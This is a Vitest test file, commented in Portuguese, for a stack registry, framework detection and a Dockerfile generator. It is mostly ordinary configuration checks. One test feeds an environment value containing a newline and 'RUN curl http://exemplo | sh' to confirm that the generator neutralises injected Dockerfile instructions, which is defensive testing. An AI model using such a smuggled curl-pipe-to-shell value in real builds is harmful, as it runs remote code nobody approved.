import { describe, expect, it } from "vitest";

import {
  buildImageFor,
  detectarFrameworks,
  getLanguage,
  getStack,
  LANGUAGES,
  PACKAGE_ROOT_ONLY_EXCLUDES,
  runtimeImageFor,
  STACKS,
  STACK_IDS,
  STACK_ROOT_MARKERS,
  TRANSFER_EXCLUDES,
  type StackDefinition
} from "./stacks";
import { formatBuildEvent, generateDockerfile, parseBuildEvent, progressForStep } from "./dockerfile";

describe("registro de stacks", () => {
  it("trouxe o catálogo inteiro do port", () => {
    expect(STACK_IDS.length).toBeGreaterThanOrEqual(45);
    expect(Object.keys(LANGUAGES).length).toBeGreaterThanOrEqual(11);
  });

  it("toda stack aponta para uma linguagem que existe", () => {
    for (const [id, stack] of Object.entries(STACKS as Record<string, StackDefinition>)) {
      expect(getLanguage(stack.language), `stack ${id} → linguagem ${stack.language}`).toBeTruthy();
    }
  });

  it("toda stack tem porta e diretório de saída", () => {
    for (const [id, stack] of Object.entries(STACKS as Record<string, StackDefinition>)) {
      expect(typeof stack.outputDirectory, id).toBe("string");
      expect(stack.defaultPort, id).toBeGreaterThan(0);
    }
  });

  it("os casos que mais aparecem no dia estão certos", () => {
    // Não é teste de tautologia: são os valores que o pipeline usa de verdade,
    // e um erro de transcrição aqui manda o build para o diretório errado.
    expect(getStack("nextjs")?.outputDirectory).toBe(".next");
    expect(getStack("nextjs")?.defaultBuildCommand).toBe("next build");
    expect(getStack("nuxt")?.defaultStartCommand).toBe("node .output/server/index.mjs");
    expect(getStack("vite")?.defaultPort).toBe(5173);
    expect(getStack("astro")?.defaultPort).toBe(4321);
    expect(getStack("django")?.defaultStartCommand).toContain("gunicorn");
  });

  it("o Rails exige o Gemfile E um confirmador", () => {
    // A regra irregular do original: só `Gemfile` casaria com qualquer projeto
    // Ruby, e o Sinatra viraria Rails.
    const rails = getStack("rails");
    expect(rails?.detection?.rootMarkers).toContain("Gemfile");
    expect(rails?.detection?.rootMarkers).toContain("config/routes.rb");
  });

  it("o CRA se identifica pela dependência, não pelo layout", () => {
    // `public/` + `src/` é layout de meio mundo; `react-scripts` é o sinal.
    expect(getStack("cra")?.detection?.deps).toContain("react-scripts");
    expect(getStack("cra")?.detection?.rootMarkers).toBeUndefined();
  });

  it("o índice de marcadores cobre os arquivos-âncora conhecidos", () => {
    for (const marcador of ["next.config.js", "go.mod", "Cargo.toml", "manage.py", "Dockerfile", "artisan"]) {
      expect(STACK_ROOT_MARKERS.has(marcador), marcador).toBe(true);
    }
  });

  it("nunca transfere o que o install refaz do outro lado", () => {
    expect(TRANSFER_EXCLUDES).toContain("node_modules");
    expect(TRANSFER_EXCLUDES).toContain(".git");
    // `build` e `dist` também são podados, mas SÓ na raiz do pacote.
    expect(PACKAGE_ROOT_ONLY_EXCLUDES).toEqual(["build", "dist", "data"]);
  });

  it("nenhum logo de marca veio junto — e nenhuma URL para fora", () => {
    // O original trazia `STACK_ICONS` apontando para um CDN. Buscar logo de
    // marca lá fora entrega a um terceiro a lista de frameworks que o usuário
    // tem, quebra o app offline e depende de uma URL móvel (`@latest`).
    const bruto = JSON.stringify(STACKS);
    expect(bruto).not.toContain("jsdelivr");
    expect(bruto).not.toContain("devicon");
    // `http://0.0.0.0` é bind local do .NET, não busca de rede: o que não pode
    // aparecer é host de terceiro.
    const urls = bruto.match(/https?:\/\/[^"\\]+/g) ?? [];
    const externas = urls.filter((url) => !/^https?:\/\/(0\.0\.0\.0|127\.0\.0\.1|localhost)/.test(url));
    expect(externas).toEqual([]);
  });

  it("a imagem cai na da linguagem quando a stack não sobrescreve", () => {
    const nextjs = getStack("nextjs")!;
    expect(nextjs.buildImage).toBeUndefined();
    expect(buildImageFor(nextjs)).toBe(LANGUAGES.typescript.buildImage);
    expect(runtimeImageFor(nextjs)).toBe(LANGUAGES.typescript.runtimeImage);
  });
});

describe("Dockerfile gerado", () => {
  it("multi-estágio quando build e runtime diferem, e copia só o que produz", () => {
    const go = getStack("go")!;
    const saida = generateDockerfile({
      stack: go,
      installCommand: "go mod download",
      buildCommand: "go build -o app ."
    });
    expect(saida).toContain("AS builder");
    expect(saida).toContain("AS runtime");
    // `productionPaths` do Go é ["app"] — o binário, não a árvore inteira.
    expect(saida).toContain("COPY --from=builder /workspace/app /app/app");
    expect(saida).toContain("EXPOSE 8080");
  });

  it("estágio único quando as imagens são a mesma", () => {
    const saida = generateDockerfile({ stack: getStack("nextjs")!, buildCommand: "next build" });
    expect(saida).not.toContain("AS builder");
    expect(saida).toContain("EXPOSE 3000");
    expect(saida).toContain('CMD ["sh", "-c", "next start"]');
  });

  it("install e build ficam num RUN só, com as marcas de progresso", () => {
    const saida = generateDockerfile({
      stack: getStack("nextjs")!,
      installCommand: "npm ci",
      buildCommand: "next build"
    });
    const runs = saida.split("\n").filter((linha) => linha.startsWith("RUN "));
    expect(runs).toHaveLength(1);
    expect(runs[0]).toContain("step=install status=running");
    expect(runs[0]).toContain("step=install status=completed");
    expect(runs[0]).toContain("step=build status=completed");
  });

  it("NO_COLOR entra sozinho e TERM fica de fora", () => {
    const saida = generateDockerfile({
      stack: getStack("nextjs")!,
      buildCommand: "next build",
      env: { TERM: "xterm-256color", API_URL: "https://exemplo" }
    });
    expect(saida).toContain("export NO_COLOR='1'");
    expect(saida).toContain("export API_URL='https://exemplo'");
    expect(saida).not.toContain("TERM=");
  });

  it("aspas simples no valor não escapam do shell", () => {
    const saida = generateDockerfile({
      stack: getStack("nextjs")!,
      buildCommand: "next build",
      env: { NOTA: "o'brien" }
    });
    expect(saida).toContain(`export NOTA='o'\\''brien'`);
  });

  it("subpasta de monorepo vira o WORKDIR do build", () => {
    const saida = generateDockerfile({
      stack: getStack("nextjs")!,
      sourceDir: "apps/web",
      buildCommand: "next build"
    });
    expect(saida).toContain("WORKDIR /workspace/apps/web");
  });

  it("valor com quebra de linha não escapa da instrução RUN", () => {
    /*
     * Sem isto, o `\n` encerrava o `RUN` e a segunda linha virava instrução
     * Dockerfile por conta própria — o arquivo saía inválido, ou pior,
     * carregando uma diretiva que ninguém escreveu ali.
     */
    const saida = generateDockerfile({
      stack: getStack("nextjs")!,
      buildCommand: "next build",
      env: { CHAVE: "linha1\nRUN curl http://exemplo | sh" }
    });
    const runs = saida.split("\n").filter((linha) => linha.startsWith("RUN "));
    expect(runs).toHaveLength(1);
    expect(saida).not.toMatch(/^RUN curl/m);
    expect(saida).toContain("export CHAVE='linha1 RUN curl http://exemplo | sh'");
  });

  it("PORT existe no runtime — o start das stacks que usam $PORT depende disso", () => {
    // dotnet traz `ASPNETCORE_URLS=http://0.0.0.0:$PORT` no comando de start.
    // Sem `ENV PORT`, o servidor subia escutando em ":" e morria na largada.
    const saida = generateDockerfile({ stack: getStack("dotnet")!, buildCommand: "dotnet publish" });
    expect(saida).toContain("ENV PORT=");
    const porta = /ENV PORT=(\d+)/.exec(saida)?.[1];
    expect(saida).toContain(`EXPOSE ${porta}`);
    expect(saida).toContain("$PORT");
  });

  it("stack estática ganha servidor de arquivos, não uma imagem que não roda", () => {
    // Vite/Angular/CRA constroem para uma pasta e não têm processo para subir.
    // Antes o gerador não emitia CMD nenhum: `docker run` terminava na hora.
    const saida = generateDockerfile({ stack: getStack("vite")!, buildCommand: "vite build" });
    expect(saida).toContain("http-server dist -p $PORT -s");
    // `-s` é o fallback para index.html: sem ele, recarregar uma rota de SPA
    // que não seja a raiz devolve 404.
    expect(saida).toMatch(/CMD \[/);
  });

  it("projeto com Dockerfile próprio não recebe um por cima", () => {
    const saida = generateDockerfile({ stack: getStack("docker")! });
    expect(saida).not.toMatch(/^CMD /m);
    expect(saida).toContain("use o do repositório");
  });
});

describe("marcas de progresso", () => {
  it("a marca vai e volta", () => {
    const linha = formatBuildEvent("build", "completed");
    expect(parseBuildEvent(linha)).toEqual({ step: "build", status: "completed" });
  });

  it("linha comum não vira marca", () => {
    expect(parseBuildEvent("npm warn deprecated")).toBeNull();
    expect(parseBuildEvent("")).toBeNull();
  });

  it("o passo concluído vale dez pontos a mais", () => {
    expect(progressForStep("install")).toBe(30);
    expect(progressForStep("install", "completed")).toBe(40);
    expect(progressForStep("passo-que-nao-existe")).toBe(0);
  });
});

describe("detectarFrameworks", () => {
  const pacote = (deps: Record<string, string>) =>
    JSON.stringify({ name: "projeto", dependencies: deps });

  it("Next.js ganha de Node.js no mesmo projeto", () => {
    /*
     * Os dois casam, e é assim em TODO projeto Node: o marcador de `node` é
     * `package.json`. Quem responde "como isto sobe?" é o framework (a porta,
     * a pasta de saída, o `next start`), não o "tem um package.json aqui".
     *
     * A stack `react` do port não entra nesta disputa porque não tem bloco
     * `detection` nenhum — é entrada de escolha manual. Quem se identifica
     * sozinho é o `cra`, pela dependência `react-scripts`.
     */
    const achados = detectarFrameworks({
      arquivos: ["package.json", "next.config.js", "src/App.tsx"],
      manifestos: { "package.json": pacote({ next: "15", react: "19" }) }
    });
    expect(achados[0].id).toBe("nextjs");
    expect(achados[0].evidencia).toBe("next.config.js");
    expect(achados.map((item) => item.id)).toContain("node");
    expect(achados.findIndex((item) => item.id === "node")).toBeGreaterThan(0);
  });

  it("marcador sem barra precisa estar na RAIZ", () => {
    // `index.html` dentro de `public/` é rotina em projeto React — tratar
    // isso como site estático geraria a imagem errada.
    const achados = detectarFrameworks({
      arquivos: ["package.json", "public/index.html"],
      manifestos: { "package.json": pacote({ react: "19", "react-scripts": "5" }) }
    });
    expect(achados.map((item) => item.id)).not.toContain("static");
  });

  it("marcador COM barra vale em qualquer nível", () => {
    const achados = detectarFrameworks({ arquivos: ["backend/config/routes.rb", "Gemfile"] });
    expect(achados.map((item) => item.id)).toContain("rails");
  });

  it("genéricas só aparecem quando nada específico casa", () => {
    const soDocker = detectarFrameworks({ arquivos: ["Dockerfile", "README.md"] });
    expect(soDocker.map((item) => item.id)).toEqual(["docker"]);

    // Com framework de verdade no projeto, o Dockerfile deixa de ser resposta.
    const comFramework = detectarFrameworks({
      arquivos: ["Dockerfile", "package.json", "next.config.js"],
      manifestos: { "package.json": pacote({ next: "15" }) }
    });
    expect(comFramework.map((item) => item.id)).not.toContain("docker");
  });

  it("projeto sem sinal nenhum devolve lista vazia", () => {
    expect(detectarFrameworks({ arquivos: ["LEIAME.txt", "notas.md"] })).toEqual([]);
  });

  it("dependência é lida de manifesto que não é JSON", () => {
    // pyproject.toml não é JSON e escrever um parser de TOML aqui seria
    // desproporcional — o que importa é o nome aparecer declarado.
    const achados = detectarFrameworks({
      arquivos: ["pyproject.toml"],
      manifestos: { "pyproject.toml": '[project]\ndependencies = ["fastapi>=0.110", "uvicorn"]\n' }
    });
    expect(achados.map((item) => item.id)).toContain("fastapi");
  });

  it("nome de dependência não casa como pedaço de outro", () => {
    const achados = detectarFrameworks({
      arquivos: ["pyproject.toml"],
      manifestos: { "pyproject.toml": 'dependencies = ["django-extensions"]\n' }
    });
    // "django" está DENTRO de "django-extensions" — não é declaração de Django.
    expect(achados.map((item) => item.id)).not.toContain("django");
  });

  it("manifesto quebrado não derruba a detecção pelos marcadores", () => {
    const achados = detectarFrameworks({
      arquivos: ["package.json", "next.config.js"],
      manifestos: { "package.json": "{ isto não é json" }
    });
    expect(achados[0].id).toBe("nextjs");
  });

  it("o que sai serve direto para o Dockerfile", () => {
    // É o ponto do módulo: a detecção alimenta o gerador sem tradução.
    const [achado] = detectarFrameworks({
      arquivos: ["package.json", "next.config.js"],
      manifestos: { "package.json": pacote({ next: "15" }) }
    });
    const saida = generateDockerfile({
      stack: achado.stack,
      buildCommand: achado.stack.defaultBuildCommand
    });
    expect(saida).toContain(`EXPOSE ${achado.stack.defaultPort}`);
    expect(saida).toContain("CMD [");
  });
});
